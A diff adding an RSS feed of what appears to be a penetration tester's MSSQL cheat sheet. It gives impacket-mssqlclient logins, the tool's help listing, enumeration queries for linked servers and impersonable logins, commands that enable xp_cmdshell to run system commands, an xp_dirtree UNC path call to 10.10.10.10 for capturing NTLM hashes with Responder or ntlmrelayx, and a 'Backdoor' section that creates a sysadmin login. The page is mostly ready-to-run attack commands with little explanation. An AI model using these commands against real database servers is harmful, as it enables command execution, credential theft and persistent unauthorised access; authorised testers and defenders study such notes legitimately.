@@ -1,0 +1,133 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>fyx(me) – UNC Path Injection MSSQL</title><link>https://fyx.me/tags/unc-path-injection-mssql/</link><description>Recent content in UNC Path Injection MSSQL on fyx(me)</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><atom:link href="https://fyx.me/tags/unc-path-injection-mssql/index.xml" rel="self" type="application/rss+xml"/><item><title>MSSQL</title><link>https://fyx.me/bazaar/windows/active-directory/mssql/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fyx.me/bazaar/windows/active-directory/mssql/</guid><description>
+&lt;h3>General&lt;span class="hx-absolute -hx-mt-20" id="general">&lt;/span>
+&lt;a href="#general" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>Guest Authentication can be allowed. If so, check if you can impersonate other users.&lt;/li>
+&lt;li>Look for linked servers, the user you can login as might be different. Also you may be able to impersonate someone else there&lt;/li>
+&lt;li>If you&amp;rsquo;re on a windows server, look for inetpub config files&lt;/li>
+&lt;/ul>
+&lt;h3>Impacket-MSSQL&lt;span class="hx-absolute -hx-mt-20" id="impacket-mssql">&lt;/span>
+&lt;a href="#impacket-mssql" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># authentication via windows auth&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">impacket-mssqlclient LAB/myuser:mypass123@sql.lab.local -windows-auth
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># mssqlclient recon&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">enum_links
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">enum_logins
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">enum_impersonate&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;h4>Helper&lt;span class="hx-absolute -hx-mt-20" id="helper">&lt;/span>
+&lt;a href="#helper" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h4>&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;pre>&lt;code>proxychains4 -q impacket-mssqlclient LAB/myuser:mypass123@sql.lab.local -windows-auth
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL01): Line 1: Changed database context to &amp;#39;master&amp;#39;.
+[*] INFO(SQL01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (110 2789)
+[!] Press help for extra shell commands
+SQL (LAB\myuser dbo@master)&amp;gt; help
+lcd {path} - changes the current local directory to {path}
+exit - terminates the server process (and this session)
+enable_xp_cmdshell - you know what it means
+disable_xp_cmdshell - you know what it means
+enum_db - enum databases
+enum_links - enum linked servers
+enum_impersonate - check logins that can be impersonated
+enum_logins - enum login users
+enum_users - enum current db users
+enum_owner - enum db owner
+exec_as_user {user} - impersonate with execute as user
+exec_as_login {login} - impersonate with execute as login
+xp_cmdshell {cmd} - executes cmd using xp_cmdshell
+xp_dirtree {path} - executes xp_dirtree on the path
+sp_start_job {cmd} - executes cmd using the sql server agent (blind)
+use_link {link} - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+! {cmd} - executes a local shell cmd
+show_query - show query
+mask_query - mask query&lt;/code>&lt;/pre>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;h3>SQL Commands&lt;span class="hx-absolute -hx-mt-20" id="sql-commands">&lt;/span>
+&lt;a href="#sql-commands" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Current&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">login&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ie&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">you&lt;/span>&lt;span class="s1">&amp;#39;re logged in as
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"># if you are using windows auth, this should be something like LAB\user
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">SELECT SYSTEM_USER;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"># The database user (gives you an idea of the permissions your authed user has)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">SELECT USER;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"># list databases
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">SELECT name FROM master..sysdatabases;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"># list linked servers
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">EXEC sp_linkedservers;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"># list logins available for impersonation
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &amp;#39;&lt;/span>&lt;span class="n">IMPERSONATE&lt;/span>&lt;span class="s1">&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"># check if XP_CMDSHELL is enabled
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">SELECT * FROM sys.configurations WHERE name = &amp;#39;&lt;/span>&lt;span class="n">xp_cmdshell&lt;/span>&lt;span class="s1">&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"># enable XP_CMDSHELL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"># requires privileges
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">EXEC sp_configure &amp;#39;&lt;/span>&lt;span class="k">show&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">advanced&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">options&lt;/span>&lt;span class="s1">&amp;#39;, 1
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">RECONFIGURE
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">EXEC sp_configure &amp;#39;&lt;/span>&lt;span class="n">xp_cmdshell&lt;/span>&lt;span class="s1">&amp;#39;, 1
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">RECONFIGURE
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">EXEC xp_cmdshell &amp;#39;&lt;/span>&lt;span class="n">whoami&lt;/span>&lt;span class="s1">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"># UNC Path injection - capture with responder, smbserver, ntmrelayx or equivalent
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">EXEC master..xp_dirtree &amp;#39;&lt;/span>&lt;span class="err">\\&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="k">share&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">txt&lt;/span>&lt;span class="s1">&amp;#39;;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;h4>SQL Commands: Backdoor&lt;span class="hx-absolute -hx-mt-20" id="sql-commands-backdoor">&lt;/span>
+&lt;a href="#sql-commands-backdoor" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h4>&lt;p>Make new database login (username &lt;code>TESTUSER&lt;/code>, password &lt;code>L0ngP4ss123&lt;/code>), map it to the &lt;code>db_owner&lt;/code> and assign the &lt;code>sysadmin&lt;/code> role:&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">LOGIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">TESTUSER&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WITH&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">PASSWORD&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">N&lt;/span>&lt;span class="s1">&amp;#39;L0ngP4ss123!&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">USER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">TESTUSER&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FOR&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">LOGIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">TESTUSER&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">ALTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ROLE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">db_owner&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ADD&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">MEMBER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">TESTUSER&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">sp_addrolemember&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">rolename&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">N&lt;/span>&lt;span class="s1">&amp;#39;db_owner&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">membername&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">N&lt;/span>&lt;span class="s1">&amp;#39;TESTUSER&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">sp_addsrvrolemember&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">rolename&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">N&lt;/span>&lt;span class="s1">&amp;#39;sysadmin&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">loginame&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">N&lt;/span>&lt;span class="s1">&amp;#39;TESTUSER&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">sp_addremotelogin&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;SQLSRV01\SQLEXPRESS&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;TESTUSER&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;h3>References and tools&lt;span class="hx-absolute -hx-mt-20" id="references-and-tools">&lt;/span>
+&lt;a href="#references-and-tools" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/mssql" target="_blank" rel="noopener">https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/mssql&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/lefayjey/SharpSQLPwn" target="_blank" rel="noopener">https://github.com/lefayjey/SharpSQLPwn&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://watchdogsacademy.gitbook.io/attacking-active-directory/mssql-servers-exploitation/mssql-trusted-links" target="_blank" rel="noopener">https://watchdogsacademy.gitbook.io/attacking-active-directory/mssql-servers-exploitation/mssql-trusted-links&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/quentinhardy/msdat" target="_blank" rel="noopener">https://github.com/quentinhardy/msdat&lt;/a>&lt;/li>
+&lt;/ul></description></item></channel></rss>
